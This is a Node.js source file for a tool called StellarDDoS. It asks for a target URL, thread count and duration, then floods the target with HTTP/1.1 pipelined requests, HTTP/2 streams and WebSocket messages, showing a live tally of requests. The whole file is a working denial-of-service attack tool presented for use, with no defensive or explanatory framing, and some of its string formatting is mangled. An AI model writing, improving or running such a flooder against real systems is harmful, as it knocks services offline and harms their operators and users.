#!/usr/bin/env node 'use strict';

const http = require('http'); const https = require('https'); const http2 = require('http2'); const WebSocket = require('ws'); const { performance } = require('perf_hooks'); const readline = require('readline'); const chalk = require('chalk');

class StellarDDoS { constructor() { this.stats = { totalRequests: 0, success: 0, failed: 0, startTime: 0 }; this.isRunning = false; this.animationChars = ['|', '/', '-', '\']; this.animationIndex = 0; }

startAttack(target, options = {}) {
    if (this.isRunning) return;
    const threads = options.threads || 50;
    const duration = options.duration || 30;
    this.isRunning = true;
    this.stats.startTime = performance.now();

    this.showStatsInterval = setInterval(() => this.showStats(), 50);
    this.animationInterval = setInterval(() => this.updateAnimation(), 50);

    this.launchPipelining(target, threads);
    this.launchHttp2(target, threads);
    this.launchWs(target, threads);

    setTimeout(() => this.stopAttack(), duration * 1000);
}

launchPipelining(target, threads) {
    const proto = target.startsWith('https') ? https : http;
    const url = new URL(target);
    const agent = new proto.Agent({ keepAlive: true, maxSockets: Infinity, maxTotalSockets: Infinity });
    for (let i = 0; i < threads * 20; i++) this.pipeliner(proto, url, agent);
}

pipeliner(proto, url, agent) {
    if (!this.isRunning) return;
    const req = proto.request({
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: url.pathname,
        method: 'GET',
        headers: { Connection: 'keep-alive' },
        agent
    });
    req.on('error', () => this.onFail());
    for (let i = 0; i < 20; i++) {
        req.write(`GET ${url.pathname}?${Math.random().toString(36).slice(2)} HTTP/1.1\r

Host: ${url.hostname}\r Connection: keep-alive\r \r `); } req.setTimeout(5000, () => req.destroy()); req.end(); req.on('response', res => res.on('end', () => this.onSuccess())); }

launchHttp2(target, threads) {
    const url = new URL(target);
    for (let i = 0; i < threads; i++) this.http2session(url);
}

http2session(url) {
    if (!this.isRunning) return;
    const client = http2.connect(url.origin);
    client.on('error', () => client.close());
    for (let i = 0; i < 50; i++) {
        const req = client.request({
            ':path': url.pathname + '?' + Math.random().toString(36).slice(2),
            ':method': 'GET'
        });
        req.on('error', () => this.onFail());
        req.on('data', () => {});
        req.on('end', () => { this.onSuccess(); req.close(); this.http2session(url); });
        req.end();
    }
    setTimeout(() => client.close(), 5000);
}

launchWs(target, threads) {
    const wsUrl = target.replace(/^http/, 'ws');
    for (let i = 0; i < threads; i++) this.wsFlood(wsUrl);
}

wsFlood(wsUrl) {
    if (!this.isRunning) return;
    const ws = new WebSocket(wsUrl);
    ws.on('open', () => {
        const msg = 'x'.repeat(1024);
        const flood = () => {
            if (!this.isRunning) return ws.close();
            ws.send(msg, err => err ? this.onFail() : this.onSuccess());
            setImmediate(flood);
        };
        flood();
    });
    ws.on('error', () => this.onFail());
}

onSuccess() { this.stats.success++; this.stats.totalRequests++; process.stdout.write(chalk.green('.')); }
onFail()    { this.stats.failed++; this.stats.totalRequests++; process.stdout.write(chalk.red('x')); }

showStats() {
    const elapsed = ((performance.now() - this.stats.startTime) / 1000).toFixed(2);
    const char = this.animationChars[this.animationIndex];
    process.stdout.write(`\r${chalk.greenBright(char)} ${elapsed}s | Requests: ${this.stats.totalRequests} | ` +
                         `${chalk.green(this.stats.success)} | ${chalk.red(this.stats.failed)}`);
}

updateAnimation() {
    this.animationIndex = (this.animationIndex + 1) % this.animationChars.length;
}

stopAttack() {
    if (!this.isRunning) return;
    clearInterval(this.showStatsInterval);
    clearInterval(this.animationInterval);
    const elapsed = ((performance.now() - this.stats.startTime) / 1000).toFixed(2);
    console.log(chalk.green(`\nAttack completed in ${elapsed}s`));
    console.log(chalk.blue(`Total requests: ${this.stats.totalRequests}`));
    console.log(chalk.green(`${this.stats.success} success`) + ' | ' + chalk.red(`${this.stats.failed} failed`));
    process.exit(0);
}

}

const rl = readline.createInterface({ input: process.stdin, output: process.stdout }); const stellar = new StellarDDoS(); rl.question(chalk.greenBright('Target URL: '), target => { rl.question(chalk.greenBright('Threads (50): '), threads => { rl.question(chalk.greenBright('Duration (30s): '), duration => { stellar.startAttack(target, { threads: parseInt(threads) || 50, duration: parseInt(duration) || 30 }); rl.on('line', line => { if (line.trim() === 'stop') { stellar.stopAttack(); rl.close(); }}); }); }); }); rl.on('close', () => stellar.stopAttack());

